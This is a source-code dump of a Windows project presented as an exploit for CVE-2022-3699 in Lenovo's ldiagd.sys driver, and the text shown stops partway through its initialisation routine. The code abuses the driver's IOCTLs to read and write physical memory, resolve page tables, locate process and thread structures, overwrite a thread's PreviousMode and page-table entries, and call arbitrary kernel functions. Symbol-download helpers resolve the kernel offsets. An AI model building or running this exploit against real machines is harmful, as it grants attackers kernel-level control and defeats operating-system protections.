Project Path: arc_gmh5225_lenovo_exec_0d996qzr

Source Tree:

```txt
arc_gmh5225_lenovo_exec_0d996qzr
├── README.md
├── ldiagd.sys
├── lenovo_exec
│   ├── EzPdb.cpp
│   ├── EzPdb.h
│   ├── LenovoMemoryMgr.cpp
│   ├── LenovoMemoryMgr.h
│   ├── lenovo_exec.vcxproj
│   ├── lenovo_exec.vcxproj.filters
│   ├── lenovo_exec.vcxproj.user
│   ├── main.cpp
│   ├── md5.cpp
│   └── md5.h
└── lenovo_exec.sln

```

`README.md`:

```md
# lenovo_exec
CVE-2022-3699 with arbitrary kernel code execution capability

original exploit: https://github.com/alfarom256/CVE-2022-3699

```

`lenovo_exec.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
VisualStudioVersion = 16.0.30804.86
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "lenovo_exec", "lenovo_exec\lenovo_exec.vcxproj", "{BF4447B0-1F74-4375-B7A7-187F9F86E868}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{BF4447B0-1F74-4375-B7A7-187F9F86E868}.Debug|x64.ActiveCfg = Debug|x64
		{BF4447B0-1F74-4375-B7A7-187F9F86E868}.Debug|x64.Build.0 = Debug|x64
		{BF4447B0-1F74-4375-B7A7-187F9F86E868}.Debug|x86.ActiveCfg = Debug|Win32
		{BF4447B0-1F74-4375-B7A7-187F9F86E868}.Debug|x86.Build.0 = Debug|Win32
		{BF4447B0-1F74-4375-B7A7-187F9F86E868}.Release|x64.ActiveCfg = Release|x64
		{BF4447B0-1F74-4375-B7A7-187F9F86E868}.Release|x64.Build.0 = Release|x64
		{BF4447B0-1F74-4375-B7A7-187F9F86E868}.Release|x86.ActiveCfg = Release|Win32
		{BF4447B0-1F74-4375-B7A7-187F9F86E868}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {CE6FEA7C-6E30-49DC-A8A0-2D9CD13FDB9F}
	EndGlobalSection
EndGlobal

```

`lenovo_exec/EzPdb.cpp`:

```cpp
#include "EzPdb.h"

// download pdb file from symbol server
// return pdb path if success, 
// or return empty string if failed, user can call GetLastError() to know wth is going on
std::string EzPdbDownload(
	IN std::string pePath, 
	IN OPTIONAL std::string pdbDownloadPath,
	IN OPTIONAL std::string symbolServer)
{
	// pdb download directory
	// if not specify, then pdb will download to current directory
	if (pdbDownloadPath == "")
	{
		char szDownloadDir[MAX_PATH] = { 0 };
		if (!GetCurrentDirectoryA(sizeof(szDownloadDir), szDownloadDir))
		{
			return "";
		}
		pdbDownloadPath = szDownloadDir;
	}

	if (pdbDownloadPath[pdbDownloadPath.size() - 1] != '\\')
	{
		pdbDownloadPath += "\\";
	}

	// make sure the directory exist
	if (!CreateDirectoryA(pdbDownloadPath.c_str(), NULL))
	{
		if (GetLastError() != ERROR_ALREADY_EXISTS)
		{
			return "";
		}
	}

	// read pe file

#ifndef _AMD64_
	PVOID OldValue = NULL;
	Wow64DisableWow64FsRedirection(&OldValue);
#endif

	std::ifstream file(pePath, std::ios::binary | std::ios::ate);
	std::streamsize size = file.tellg();
	file.seekg(0, std::ios::beg);
	std::vector<char> buffer(size);

#ifndef _AMD64_
	Wow64RevertWow64FsRedirection(&OldValue);
#endif

	if (!file.read(buffer.data(), size) || size==0)
	{
		SetLastError(ERROR_ACCESS_DENIED);
		return "";
	}

	std::string pdbPath = pdbDownloadPath + Md5(buffer.data(), (ULONG)size) + ".pdb";

	// get pdb info from debug info directory
	IMAGE_DOS_HEADER* pDos = (IMAGE_DOS_HEADER*)buffer.data();
	IMAGE_NT_HEADERS* pNT = (IMAGE_NT_HEADERS*)(buffer.data() + pDos->e_lfanew);
	IMAGE_FILE_HEADER* pFile = &pNT->FileHeader;
	IMAGE_OPTIONAL_HEADER64* pOpt64 = NULL;
	IMAGE_OPTIONAL_HEADER32* pOpt32 = NULL;
	BOOL x86 = FALSE;
	if (pFile->Machine == IMAGE_FILE_MACHINE_AMD64)
	{
		pOpt64 = (IMAGE_OPTIONAL_HEADER64*)(&pNT->OptionalHeader);
	}
	else if (pFile->Machine == IMAGE_FILE_MACHINE_I386)
	{
		pOpt32 = (IMAGE_OPTIONAL_HEADER32*)(&pNT->OptionalHeader);
		x86 = TRUE;
	}
	else
	{
		SetLastError( ERROR_NOT_SUPPORTED);
		return "";
	}
	DWORD ImageSize = x86 ? pOpt32->SizeOfImage : pOpt64->SizeOfImage;

	// file buffer to image buffer
	PBYTE ImageBuffer = (PBYTE)malloc(ImageSize);
	if (!ImageBuffer)
	{
		SetLastError(ERROR_NOT_ENOUGH_MEMORY);
		return "";
	}
	memcpy(ImageBuffer, buffer.data(), x86 ? pOpt32->SizeOfHeaders : pOpt64->SizeOfHeaders);
	IMAGE_SECTION_HEADER* pCurrentSectionHeader = IMAGE_FIRST_SECTION(pNT);
	for (UINT i = 0; i != pFile->NumberOfSections; ++i, ++pCurrentSectionHeader)
	{
		if (pCurrentSectionHeader->SizeOfRawData)
		{
			memcpy(ImageBuffer + pCurrentSectionHeader->VirtualAddress, buffer.data() + pCurrentSectionHeader->PointerToRawData, pCurrentSectionHeader->SizeOfRawData);
		}
	}
	IMAGE_DATA_DIRECTORY* pDataDir = nullptr;
	if (x86)
	{
		pDataDir = &pOpt32->DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG];
	}
	else
	{
		pDataDir = &pOpt64->DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG];
	}
	IMAGE_DEBUG_DIRECTORY* pDebugDir = (IMAGE_DEBUG_DIRECTORY*)(ImageBuffer + pDataDir->VirtualAddress);
	if (!pDataDir->Size || IMAGE_DEBUG_TYPE_CODEVIEW != pDebugDir->Type)
	{
		// invalid debug dir
		free(ImageBuffer);
		SetLastError( ERROR_NOT_SUPPORTED);
		return "";
	}
	PdbInfo* pdb_info = (PdbInfo*)(ImageBuffer + pDebugDir->AddressOfRawData);
	if (pdb_info->Signature != 0x53445352)
	{
		// invalid debug dir
		free(ImageBuffer);
		SetLastError(ERROR_NOT_SUPPORTED);
		return "";
	}

	if (!std::filesystem::exists(pdbPath))
	{
		// download pdb
		wchar_t w_GUID[100] = { 0 };
		if (!StringFromGUID2(pdb_info->Guid, w_GUID, 100))
		{
			free(ImageBuffer);
			SetLastError(ERROR_NOT_SUPPORTED);
			return "";
		}
		char a_GUID[100]{ 0 };
		size_t l_GUID = 0;
		if (wcstombs_s(&l_GUID, a_GUID, w_GUID, sizeof(a_GUID)) || !l_GUID)
		{
			free(ImageBuffer);
			SetLastError(ERROR_NOT_SUPPORTED);
			return "";
		}

		char guid_filtered[256] = { 0 };
		for (UINT i = 0; i != l_GUID; ++i)
		{
			if ((a_GUID[i] >= '0' && a_GUID[i] <= '9') || (a_GUID[i] >= 'A' && a_GUID[i] <= 'F') || (a_GUID[i] >= 'a' && a_GUID[i] <= 'f'))
			{
				guid_filtered[strlen(guid_filtered)] = a_GUID[i];
			}
		}

		char age[3] = { 0 };
		_itoa_s(pdb_info->Age, age, 10);

		// url
		std::string url = symbolServer;
		url += pdb_info->PdbFileName;
		url += "/";
		url += guid_filtered;
		url += age;
		url += "/";
		url += pdb_info->PdbFileName;

		// download
		HRESULT hr = URLDownloadToFileA(NULL, url.c_str(), pdbPath.c_str(), NULL, NULL);
		if (FAILED(hr))
		{
			free(ImageBuffer);
			return "";
		}

		free(ImageBuffer);
	}
	
	return pdbPath;
}


// load pdb
// return true if success, or return false if failed, user can call GetLastError() to know wth is going on
bool EzPdbLoad(IN std::string pdbPath, OUT PEZPDB Pdb)
{
	memset(Pdb, 0, sizeof(EZPDB));

	// get pdb file size
	WIN32_FILE_ATTRIBUTE_DATA file_attr_data{ 0 };
	if (!GetFileAttributesExA(pdbPath.c_str(), GetFileExInfoStandard, &file_attr_data))
	{
		return false;
	}
	auto pdbSize = file_attr_data.nFileSizeLow;

	// open pdb file
	HANDLE hPdbFile = CreateFileA(pdbPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hPdbFile == INVALID_HANDLE_VALUE)
	{
		return false;
	}

	// open current process
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, GetCurrentProcessId());
	if (!hProcess)
	{
		CloseHandle(hPdbFile);
		return false;
	}

	// Initializes the symbol handler for a process
	if (!SymInitialize(hProcess, pdbPath.c_str(), FALSE))
	{
		CloseHandle(hProcess);
		CloseHandle(hPdbFile);
		return false;
	}

	SymSetOptions(SYMOPT_UNDNAME | SYMOPT_DEFERRED_LOADS | SYMOPT_AUTO_PUBLICS | SYMOPT_DEBUG | SYMOPT_LOAD_ANYTHING);
	//SymSetOptions(SYMOPT_UNDNAME | SYMOPT_DEFERRED_LOADS | SYMOPT_AUTO_PUBLICS | SYMOPT_LOAD_ANYTHING);

	DWORD64 SymbolTable = SymLoadModuleEx(hProcess, NULL, pdbPath.c_str(), NULL, EZ_PDB_BASE_OF_DLL, pdbSize, NULL, NULL);
	if (!SymbolTable)
	{
		SymCleanup(hProcess);
		CloseHandle(hProcess);
		CloseHandle(hPdbFile);
		return false;
	}

	Pdb->hPdbFile = hPdbFile;
	Pdb->hProcess = hProcess;
	return true;
}

// get function / global variable rva
// return -1 if failed
ULONG EzPdbGetRva(IN PEZPDB Pdb, IN std::string SymName)
{
	SYMBOL_INFO si = { 0 };
	si.SizeOfStruct = sizeof(SYMBOL_INFO);
	if (!SymFromName(Pdb->hProcess, SymName.c_str(), &si))
	{
		return (ULONG)-1;
	}
	return (ULONG)(si.Address - si.ModBase);
}

// get struct property offset
// return -1 if failed
ULONG EzPdbGetStructPropertyOffset(IN PEZPDB Pdb, IN std::string StructName, IN std::wstring PropertyName)
{
	ULONG SymInfoSize = sizeof(SYMBOL_INFO) + MAX_SYM_NAME * sizeof(TCHAR);
	SYMBOL_INFO* SymInfo = (SYMBOL_INFO*)malloc(SymInfoSize);
	if (!SymInfo)
	{
		return  (ULONG)-1;
	}
	ZeroMemory(SymInfo, SymInfoSize);
	SymInfo->SizeOfStruct = sizeof(SYMBOL_INFO);
	SymInfo->MaxNameLen = MAX_SYM_NAME;
	if (!SymGetTypeFromName(Pdb->hProcess, EZ_PDB_BASE_OF_DLL, StructName.c_str(), SymInfo))
	{
		return  (ULONG)-1;
	}

	TI_FINDCHILDREN_PARAMS TempFp = { 0 };
	if (!SymGetTypeInfo(Pdb->hProcess, EZ_PDB_BASE_OF_DLL, SymInfo->TypeIndex, TI_GET_CHILDRENCOUNT, &TempFp))
	{
		free(SymInfo);
		return  (ULONG)-1;
	}

	ULONG ChildParamsSize = sizeof(TI_FINDCHILDREN_PARAMS) + TempFp.Count * sizeof(ULONG);
	TI_FINDCHILDREN_PARAMS* ChildParams = (TI_FINDCHILDREN_PARAMS*)malloc(ChildParamsSize);
	if (ChildParams == NULL)
	{
		free(SymInfo);
		return (ULONG)-1;
	}
	ZeroMemory(ChildParams, ChildParamsSize);
	memcpy(ChildParams, &TempFp, sizeof(TI_FINDCHILDREN_PARAMS));
	if (!SymGetTypeInfo(Pdb->hProcess, EZ_PDB_BASE_OF_DLL, SymInfo->TypeIndex, TI_FINDCHILDREN, ChildParams))
	{
		goto failed;
	}
	for (ULONG i = ChildParams->Start; i < ChildParams->Count; i++)
	{
		WCHAR* pSymName = NULL;
		ULONG Offset = 0;
		if (!SymGetTypeInfo(Pdb->hProcess, EZ_PDB_BASE_OF_DLL, ChildParams->ChildId[i], TI_GET_OFFSET, &Offset))
		{
			goto failed;
		}
		if (!SymGetTypeInfo(Pdb->hProcess, EZ_PDB_BASE_OF_DLL, ChildParams->ChildId[i], TI_GET_SYMNAME, &pSymName))
		{
			goto failed;
		}
		if (pSymName)
		{
			//wprintf(L"%x %s\n", Offset, pSymName);
			if (wcscmp(pSymName, PropertyName.c_str()) == 0)
			{
				LocalFree(pSymName);
				free(ChildParams);
				free(SymInfo);
				return Offset;
			}
		}
	}
failed:
	free(ChildParams);
	free(SymInfo);
	return  (ULONG)-1;
}

// get struct size, failed return -1
ULONG EzPdbGetStructSize(IN PEZPDB Pdb, IN std::string StructName)
{
	ULONG SymInfoSize = sizeof(SYMBOL_INFO) + MAX_SYM_NAME * sizeof(TCHAR);
	SYMBOL_INFO* SymInfo = (SYMBOL_INFO*)malloc(SymInfoSize);
	if (!SymInfo)
	{
		return (ULONG)-1;
	}
	ZeroMemory(SymInfo, SymInfoSize);
	SymInfo->SizeOfStruct = sizeof(SYMBOL_INFO);
	SymInfo->MaxNameLen = MAX_SYM_NAME;
	if (!SymGetTypeFromName(Pdb->hProcess, EZ_PDB_BASE_OF_DLL, StructName.c_str(), SymInfo))
	{
		return  (ULONG)-1;
	}
	return SymInfo->Size;
}

// close handle
VOID EzPdbUnload(IN PEZPDB Pdb)
{
	// 清理工作
	SymUnloadModule64(Pdb->hProcess, EZ_PDB_BASE_OF_DLL);
	SymCleanup(Pdb->hProcess);
	CloseHandle(Pdb->hProcess);
	CloseHandle(Pdb->hPdbFile);
}




```

`lenovo_exec/EzPdb.h`:

```h
#pragma once

#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <Windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <string>
#include <fstream>
#include <vector>
#include <filesystem>
#include "md5.h"
#pragma comment(lib, "DbgHelp.lib")
#pragma comment(lib, "Urlmon.lib")


//Thanks mambda
//https://bitbucket.org/mambda/pdb-parser/src/master/
struct PDBHeader7
{
	char signature[0x20];
	int page_size;
	int allocation_table_pointer;
	int file_page_count;
	int root_stream_size;
	int reserved;
	int root_stream_page_number_list_number;
};

struct RootStream7
{
	int num_streams;
	int stream_sizes[1]; //num_streams
};

struct GUID_StreamData
{
	int ver;
	int date;
	int age;
	GUID guid;
};

struct PdbInfo
{
	DWORD	Signature;
	GUID	Guid;
	DWORD	Age;
	char	PdbFileName[1];
};

#define EZ_PDB_BASE_OF_DLL (DWORD64)0x10000000

typedef struct _EZPDB
{
	HANDLE hProcess;
	HANDLE hPdbFile;
}EZPDB, *PEZPDB;



std::string EzPdbDownload(
	IN std::string pePath,
	IN OPTIONAL std::string pdbDownloadPath = "",
	IN OPTIONAL std::string symbolServer = "https://msdl.microsoft.com/download/symbols/");

bool EzPdbLoad(IN std::string pdbPath, OUT PEZPDB Pdb);

ULONG EzPdbGetRva(IN PEZPDB Pdb, IN std::string SymName);

ULONG EzPdbGetStructPropertyOffset(IN PEZPDB Pdb, IN std::string StructName, IN std::wstring PropertyName);

ULONG EzPdbGetStructSize(IN PEZPDB Pdb, IN std::string StructName);

VOID EzPdbUnload(IN PEZPDB Pdb);


```

`lenovo_exec/LenovoMemoryMgr.cpp`:

```cpp
#include "LenovoMemoryMgr.h"
#include "EzPdb.h"
#include <conio.h>
#include <iostream>

UINT64 LenovoMemoryMgr::CallKernelFunction(UINT64 address, UINT64 arg1, UINT64 arg2, UINT64 arg3, UINT64 arg4)
{
	if (!address) 
	{
		return -1;
	}

	CALL_DATA call_data;
	memset(&call_data, 0, sizeof(call_data));

	UINT64 call_result = 0;

	call_data.FunctionAddr = address;
	call_data.Arg1 = arg1;
	call_data.Arg2 = arg2;
	call_data.Arg3 = arg3;
	call_data.Arg4 = arg4;
	call_data.CallResult0 = reinterpret_cast<UINT64>(&call_result);
	
	DWORD dwBytesReturned = 0;

	DeviceIoControl
	(
		hDevice,
		0x222000,
		&call_data,
		sizeof(CALL_DATA),
		&call_data,
		sizeof(CALL_DATA),
		&dwBytesReturned,
		NULL
	);

	return call_result;
}

template <typename T>
requires(sizeof(T) == 1 || sizeof(T) == 2 || sizeof(T) == 4 || sizeof(T) == 8)
BOOL LenovoMemoryMgr::ReadPhysData(UINT64 address, T* data)
{
    if (!data) 
	{
        return FALSE;
    }

	LDIAG_READ lr = { 0 };
	BOOL bStatus = FALSE;
	DWORD dwBytesReturned = 0;
	DWORD64 outbuffer = 0;

	lr.data = address;
	lr.wLen = sizeof(DWORD64);

	bStatus = DeviceIoControl(
		hDevice,
		IOCTL_PHYS_RD,
		&lr,
		sizeof(LDIAG_READ),
		&outbuffer,
		sizeof(DWORD64),
		&dwBytesReturned,
		NULL
	);

	if (!bStatus) {
		return FALSE;
	}

	*data = (T)outbuffer;
    return TRUE;
}

template<typename T>
requires(sizeof(T) == 1 || sizeof(T) == 2 || sizeof(T) == 4 || sizeof(T) == 8)
BOOL LenovoMemoryMgr::WritePhysData(_In_ UINT64 PhysDest, _In_ T* data)
{
	if (!data && !PhysDest) 
	{
		return FALSE;
	}

	NTSTATUS status = 0;
	BOOL bRes = FALSE;
	LDIAG_WRITE lw = { 0 };
	DWORD dwBytesReturned = 0;

	lw._where = PhysDest;
	lw._what_ptr = (DWORD64)data;
	lw.dwMapSize = (DWORD)sizeof(T);
	lw.dwLo = 0x6C61696E;

	status = DeviceIoControl(
		hDevice,
		IOCTL_PHYS_WR,
		&lw,
		sizeof(LDIAG_WRITE),
		NULL,
		0,
		&dwBytesReturned,
		NULL
	);

	return NT_SUCCESS(status);
}

template<typename T>
requires(sizeof(T) == 1 || sizeof(T) == 2 || sizeof(T) == 4 || sizeof(T) == 8)
BOOL LenovoMemoryMgr::ReadVirtData(UINT64 address, T* data)
{
	if (!data) {
		return FALSE;
	}

	if (!WritePhysData(physSwapAddr, (T*)address)) {
		return FALSE;
	}

	return ReadPhysData(physSwapAddr, data);
}

template<typename T>
requires(sizeof(T) == 1 || sizeof(T) == 2 || sizeof(T) == 4 || sizeof(T) == 8)
BOOL LenovoMemoryMgr::WriteVirtData(UINT64 address, T* data)
{
	if (!data) {
		return FALSE;
	}

	PAGE_TABLE_ENTRY pte = { 0 };
	PFILL_PTE_HIERARCHY PteHierarchy = CreatePteHierarchy(address);

	PageType pt = GetPageTypeForVirtualAddress(address, &pte);
	UINT64 PhysAddr = VtoP(address, pte.flags.Pfn, pt);

	return WritePhysData(PhysAddr, data);
}

// https://github.com/ch3rn0byl/CVE-2021-21551/blob/master/CVE-2021-21551/DellBiosUtil.cpp
PFILL_PTE_HIERARCHY LenovoMemoryMgr::CreatePteHierarchy(UINT64 VirtualAddress)
{
	PFILL_PTE_HIERARCHY retval = new FILL_PTE_HIERARCHY;

	///
	/// Resolve the PTE address
	/// 
	VirtualAddress >>= 9;
	VirtualAddress &= 0x7FFFFFFFF8;
	VirtualAddress += PteBase;

	retval->PTE = VirtualAddress;

	///
	/// Resolve the PDE address
	/// 
	VirtualAddress >>= 9;
	VirtualAddress &= 0x7FFFFFFFF8;
	VirtualAddress += PteBase;

	retval->PDE = VirtualAddress;

	///
	/// Resolve the PPE address
	/// 
	VirtualAddress >>= 9;
	VirtualAddress &= 0x7FFFFFFFF8;
	VirtualAddress += PteBase;

	retval->PPE = VirtualAddress;

	///
	/// Resolve the PXE address
	/// 
	VirtualAddress >>= 9;
	VirtualAddress &= 0x7FFFFFFFF8;
	VirtualAddress += PteBase;

	retval->PXE = VirtualAddress;

	return retval;
}

UINT64 LenovoMemoryMgr::FindPhysSwapSpace()
{
	UINT64 begin = 0x1000;
	UINT64 end = 0x10000;
	BOOL bRes = FALSE;
	UINT64 val = 0;
	while (begin < end) {
		bRes = ReadPhysData<UINT64>(begin, &val);
		if (!bRes) {
			return NULL;
		}

		if (!val) {
			return begin;
		}

		begin += 8;
	}
	return NULL;
}

UINT64 LenovoMemoryMgr::GetPteBase()
{
	const auto address = NtosBase + mi_get_pte_address_offset + 0x13;
	UINT64 qwPteBase = 0;

	ReadVirtData(address, &qwPteBase);

	return qwPteBase;
}

UINT64 LenovoMemoryMgr::VtoP(UINT64 va, UINT64 index, PageType p)
{
	switch (p) {
	case PageType::UsePte:
		va &= 0xfff;
		break;
	case PageType::UsePde:
		va &= 0x1fffff;
		break;
	default:
		return 0;
	}
	return (index << 12) + va;
}

PageType LenovoMemoryMgr::GetPageTypeForVirtualAddress(UINT64 VirtAddress, PPAGE_TABLE_ENTRY PageTableEntry)
{
	// fill the pte hierarchy for the virtual address
	PFILL_PTE_HIERARCHY hierarchy = CreatePteHierarchy(VirtAddress);

	// read the PTE contents, if they are zero we are using large pages
	// if the PDE is also zero, god help you
	ReadVirtData<UINT64>(hierarchy->PTE, &PageTableEntry->value);

	if (!PageTableEntry->value) 
	{
		ReadVirtData<UINT64>(hierarchy->PDE, &PageTableEntry->value);
		return PageType::UsePde;
	}

	return PageType::UsePte;
}

UINT64 LenovoMemoryMgr::FindNtosBase()
{
	UINT64 retval = 0;
	HANDLE hHeap = GetProcessHeap();
	LPVOID lpHeapBuffer = HeapAlloc(hHeap, 0, 0x2000);
	DWORD dwBytesReturned = 0;

	if (!lpHeapBuffer) {
		return NULL;
	}

	NTSTATUS status = NtQuerySystemInformation(
		(SYSTEM_INFORMATION_CLASS)SYS_INFO_CLASS_MODULE_INFO,
		lpHeapBuffer,
		0x2000,
		&dwBytesReturned
	);

	// realloc and try again
	// todo: add switch case for status
	if (!NT_SUCCESS(status)) {
		HeapFree(hHeap, 0, lpHeapBuffer);
		lpHeapBuffer = HeapAlloc(hHeap, 0, dwBytesReturned);

		if (!lpHeapBuffer) {
			return NULL;
		}

		status = NtQuerySystemInformation(
			(SYSTEM_INFORMATION_CLASS)SYS_INFO_CLASS_MODULE_INFO,
			lpHeapBuffer,
			dwBytesReturned,
			&dwBytesReturned
		);

		if (!NT_SUCCESS(status)) {
			return NULL;
		}
	}

	PSYSTEM_MODULE_INFORMATION psm = (PSYSTEM_MODULE_INFORMATION)lpHeapBuffer;
	if (psm->ModulesCount > 0) {
		retval = (UINT64)psm->Modules[0].ImageBase;
		HeapFree(hHeap, 0, lpHeapBuffer);
		return retval;
	}

	return NULL;
}

/*
		Todo: ensure our reads aren't crossing a page boundary
*/
_Use_decl_annotations_
UINT64 LenovoMemoryMgr::FindBase(const char* image_name)
{
	UINT64 retval = 0;
	HANDLE hHeap = GetProcessHeap();
	LPVOID lpHeapBuffer = HeapAlloc(hHeap, 0, 0x2000);
	DWORD dwBytesReturned = 0;

	if (!lpHeapBuffer) {
		return NULL;
	}

	NTSTATUS status = NtQuerySystemInformation(
		(SYSTEM_INFORMATION_CLASS)SYS_INFO_CLASS_MODULE_INFO,
		lpHeapBuffer,
		0x2000,
		&dwBytesReturned
	);

	// realloc and try again
	// todo: add switch case for status
	if (!NT_SUCCESS(status)) {
		HeapFree(hHeap, 0, lpHeapBuffer);
		lpHeapBuffer = HeapAlloc(hHeap, 0, dwBytesReturned);

		if (!lpHeapBuffer) {
			return NULL;
		}

		status = NtQuerySystemInformation(
			(SYSTEM_INFORMATION_CLASS)SYS_INFO_CLASS_MODULE_INFO,
			lpHeapBuffer,
			dwBytesReturned,
			&dwBytesReturned
		);

		if (!NT_SUCCESS(status)) {
			return NULL;
		}
	}

	PSYSTEM_MODULE_INFORMATION psm = (PSYSTEM_MODULE_INFORMATION)lpHeapBuffer;
	if (psm->ModulesCount > 0) {

		for (int i = 0; i < psm->ModulesCount; i++)
		{
			if (strstr(psm->Modules[i].ImageName, image_name))
			{
				retval = (UINT64)psm->Modules[i].ImageBase;
				break;
			}
		}

		HeapFree(hHeap, 0, lpHeapBuffer);
		return retval;
	}

	return NULL;
}

UINT64 LenovoMemoryMgr::GetPsInitialSystemProc()
{
	HMODULE hNtos = LoadLibraryA("ntoskrnl.exe");
	if (!hNtos) {
		return NULL;
	}

	PVOID initial_proc = GetProcAddress(hNtos, "PsInitialSystemProcess");
	initial_proc = (PVOID)(((SIZE_T)initial_proc - (SIZE_T)hNtos) + (SIZE_T)NtosBase);
	FreeLibrary(hNtos);
	return (UINT64)initial_proc;
}

UINT64 LenovoMemoryMgr::GetKernelExport(const char* function_name)
{
	HMODULE hNtos = LoadLibraryA("ntoskrnl.exe");
	if (!hNtos) {
		return NULL;
	}

	PVOID initial_proc = GetProcAddress(hNtos, function_name);
	initial_proc = (PVOID)(((SIZE_T)initial_proc - (SIZE_T)hNtos) + (SIZE_T)NtosBase);
	FreeLibrary(hNtos);
	return (UINT64)initial_proc;
}

BOOL LenovoMemoryMgr::SearchEprocessLinksForPid(UINT64 Pid, UINT64 SystemEprocess, PUINT64 lpTargetProcess)
{
	BOOL bRes = FALSE;
	if (!lpTargetProcess) {
		return FALSE;
	}

	UINT64 ListIter = SystemEprocess + process_active_process_links_offset;
	UINT64 ListHead = ListIter;

	while (TRUE) 
	{
		bRes = ReadVirtData((ListIter + 0x8), &ListIter);

		if (!bRes) 
		{
			return FALSE;
		}

		if (ListIter == ListHead) 
		{
			return FALSE;
		}

		UINT64 IterEprocessBase = ListIter - process_active_process_links_offset;
		UINT64 IterPid = 0;

		bRes = ReadVirtData((IterEprocessBase + process_pid_offset), &IterPid);

		if (!bRes) 
		{
			return FALSE;
		}

		if (IterPid == Pid) 
		{
			*lpTargetProcess = IterEprocessBase;
			return TRUE;
		}
	}
}

UINT64 LenovoMemoryMgr::GetPreviousModeAddress()
{
	const auto system_process_ptr = GetPsInitialSystemProc();
	UINT64 system_process = 0;
	ReadVirtData(system_process_ptr, &system_process);

	UINT64 current_process = 0;

	if (SearchEprocessLinksForPid(GetCurrentProcessId(), system_process, &current_process))
	{
		auto thread_head_list = current_process + process_thread_head_list_offset;

		UINT64 ListIter = thread_head_list;
		UINT64 ListHead = ListIter;

		while (TRUE) 
		{
			auto bRes = ReadVirtData((ListIter + 0x8), &ListIter);

			if (!bRes) 
			{
				break;
			}

			if (ListIter == ListHead) 
			{
				break;
			}

			UINT64 iter_thread = ListIter - thread_list_entry_offset;
			UINT64 IterTid = 0;

			bRes = ReadVirtData((iter_thread + thread_id_offset), &IterTid);
			
			if (GetCurrentThreadId() == IterTid)
			{
				return iter_thread + thread_previous_mode_offset;
			}
		}
	}

	return 0;
}

UINT64 LenovoMemoryMgr::GetPageTableInfo(UINT64 address, PAGE_TABLE_ENTRY& entry)
{
	if (!address) return 0;

	PAGE_TABLE_ENTRY pte = { 0 };
	PFILL_PTE_HIERARCHY PteHierarchy = CreatePteHierarchy(address);

	PageType pt = GetPageTypeForVirtualAddress(address, &pte);
	entry = pte;

	if (pt == UsePte)
	{
		return PteHierarchy->PTE;
	}
	else if (pt == UsePde)
	{
		return PteHierarchy->PDE;
	}

	return 0;
}

BOOL LenovoMemoryMgr::WritePageTable(UINT64 page_table_address, PAGE_TABLE_ENTRY entry)
{
	NTSTATUS status = 0;
	BOOL bRes = FALSE;

	const auto ldiagd_address = FindBase("ldiagd.sys");
	const auto address = ldiagd_address + 0x4100;

	WriteVirtData(address, &entry.value);

	PAGE_TABLE_ENTRY pte = { 0 };
	PFILL_PTE_HIERARCHY PteHierarchy = CreatePteHierarchy(address);

	PageType pt = GetPageTypeForVirtualAddress(address, &pte);
	UINT64 PhysAddr = VtoP(address, pte.flags.Pfn, pt);

	LDIAG_READ lr = { 0 };
	BOOL bStatus = FALSE;
	DWORD dwBytesReturned = 0;

	lr.data = PhysAddr;
	lr.wLen = sizeof(DWORD64);

	const auto prev_mode_address = GetPreviousModeAddress();

	uint8_t previous_mode = 0;
	WriteVirtData(prev_mode_address, &previous_mode);

	bStatus = DeviceIoControl
	(
		hDevice,
		IOCTL_PHYS_RD,
		&lr,
		sizeof(LDIAG_READ),
		reinterpret_cast<void*>(page_table_address),
		sizeof(DWORD64),
		&dwBytesReturned,
		NULL
	);

	previous_mode = 1;
	WriteVirtData(prev_mode_address, &previous_mode);

	return status;
}

BOOL LenovoMemoryMgr::Init()
{
    HANDLE hDev = CreateFileA
	(
        strDeviceName,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDev == NULL || hDev == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

	NtosBase = FindNtosBase();
    hDevice = hDev;
	physSwapAddr = FindPhysSwapSpace();

#ifdef USE_STATIC_OFFSETS

	process_active_process_links_offset = OFFSET_EPROCESS_LINKS;
	process_pid_offset = OFFSET_EPROCESS_PID;
	process_thread_head_list_offset = OFFSET_EPROCESS_THREAD_HEAD_LIST;

	thread_id_offset = OFFSET_ETHREAD_ID;
	thread_previous_mode_offset = OFFSET_ETHREAD_PREVIOUS_MODE;
	thread_list_entry_offset = OFFSET_ETHREAD_LIST_ENTRY;

	mi_get_pte_address_offset = OFFSET_MI_GET_PTE_ADDRESS;

#else

	std::string kernel = std::string(std::getenv("systemroot")) + "\\System32\\ntoskrnl.exe";
	std::string pdbPath = EzPdbDownload(kernel);

	if (pdbPath.empty())
	{
		std::cout << "download pdb failed " << GetLastError() << std::endl;;
		return FALSE;
	}

	EZPDB pdb;

	if (!EzPdbLoad(pdbPath, &pdb))
	{
		std::cout << "load pdb failed " << GetLastError() << std::endl;
		return FALSE;
	}

	process_active_process_links_offset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"ActiveProcessLinks");
	process_pid_offset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"UniqueProcessId");
	process_thread_head_list_offset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"ThreadListHead");

	thread_id_offset = EzPdbGetStructPropertyOffset(&pdb, "_ETHREAD", L"Cid") + 0x8;
	thread_previous_mode_offset = EzPdbGetStructPropertyOffset(&pdb, "_KTHREAD", L"PreviousMode");
